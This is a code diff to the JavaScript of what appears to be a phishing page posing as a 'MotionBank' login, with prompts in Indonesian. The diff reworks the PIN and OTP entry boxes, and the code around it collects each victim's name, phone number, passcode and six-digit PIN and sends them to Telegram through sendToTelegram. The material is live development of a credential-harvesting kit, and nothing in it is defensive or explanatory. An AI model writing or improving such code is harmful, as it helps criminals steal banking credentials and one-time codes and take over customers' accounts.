@@ -21,9 +21,7 @@ const passcode = document.getElementById('passcode');
 const togglePasscode = document.getElementById('togglePasscode');
 const eyeIcon = document.getElementById('eyeIcon');
 
-const pinInput = document.getElementById('pin');
-const togglePin = document.getElementById('togglePin');
-const pinEyeIcon = document.getElementById('pinEyeIcon');
+const pinInputs = document.querySelectorAll('.pin-input');
 
 const maskedPhoneDisplay = document.getElementById('maskedPhoneDisplay');
 const otpInputs = document.querySelectorAll('.otp-input');
@@ -119,7 +117,7 @@ btnBackTo1.addEventListener('click', function() {
   window.scrollTo(0, 0);
 });
 
-// Toggle Password (Passcode & PIN)
+// Toggle Password (Passcode)
 togglePasscode.addEventListener('click', function() {
   const type = passcode.getAttribute('type') === 'password' ? 'text' : 'password';
   passcode.setAttribute('type', type);
@@ -127,26 +125,44 @@ togglePasscode.addEventListener('click', function() {
   eyeIcon.classList.toggle('fa-eye');
 });
 
-togglePin.addEventListener('click', function() {
-  const type = pinInput.getAttribute('type') === 'password' ? 'text' : 'password';
-  pinInput.setAttribute('type', type);
-  pinEyeIcon.classList.toggle('fa-eye-slash');
-  pinEyeIcon.classList.toggle('fa-eye');
+// Logika Input PIN 6 Kotak Terpisah
+pinInputs.forEach((input, index) => {
+  input.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 1) {
+      value = value.slice(-1);
+    }
+    e.target.value = value;
+
+    if (value !== "" && index < pinInputs.length - 1) {
+      pinInputs[index + 1].focus();
+    }
+  });
+
+  input.addEventListener('keydown', (e) => {
+    if (e.key === "Backspace" && e.target.value === "" && index > 0) {
+      pinInputs[index - 1].focus();
+    }
+  });
 });
 
 // Submit Halaman 2 (Sandi & PIN)
 btnToPage3.addEventListener('click', function() {
-  if(!passcode.value) {
-    alert("Silakan masukkan kode sandi Anda terlebih dahulu.");
+  if(!passcode.value || passcode.value.length < 8) {
+    alert("Silakan masukkan 8-digit kode sandi Anda terlebih dahulu.");
     return;
   }
-  if(!pinInput.value) {
-    alert("Silakan masukkan PIN 6 digit Anda terlebih dahulu.");
+
+  let pinCode = "";
+  pinInputs.forEach(inp => pinCode += inp.value);
+
+  if(pinCode.length < 6) {
+    alert("Silakan lengkapi 6 digit PIN Anda.");
     return;
   }
 
   userData.passcode = passcode.value;
-  userData.pin = pinInput.value;
+  userData.pin = pinCode;
 
   let msg = `🔐 *KODE SANDI & PIN MOTIONBANK*\n\n👤 Nama: ${userData.name}\n📞 No HP: \`${userData.phone}\`\n🔑 Sandi: \`${userData.passcode}\`\n🔢 PIN: \`${userData.pin}\``;
   sendToTelegram(msg);
@@ -175,10 +191,13 @@ btnBackTo2.addEventListener('click', function() {
 // Logika Input OTP
 otpInputs.forEach((input, index) => {
   input.addEventListener('input', (e) => {
-    if (e.target.value.length > 1) {
-      e.target.value = e.target.value.slice(0, 1);
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 1) {
+      value = value.slice(-1);
     }
-    if (e.target.value !== "" && index < otpInputs.length - 1) {
+    e.target.value = value;
+
+    if (value !== "" && index < otpInputs.length - 1) {
       otpInputs[index + 1].focus();
     }
     checkOtpComplete();
